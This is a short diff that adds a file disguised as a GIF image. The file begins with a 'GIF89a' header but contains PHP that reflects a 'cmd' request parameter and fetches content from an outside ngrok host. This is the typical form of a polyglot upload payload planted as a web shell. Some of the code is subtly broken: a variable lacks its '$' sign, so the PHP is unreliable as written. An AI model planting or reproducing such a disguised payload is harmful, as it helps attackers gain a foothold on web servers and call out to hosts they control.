@@ -1,0 +1,5 @@
+GIF89a;
+<?php
+echo($_GET["cmd"]);
+x=file_get_contents("https://7f23f599.ngrok.io");
+?>
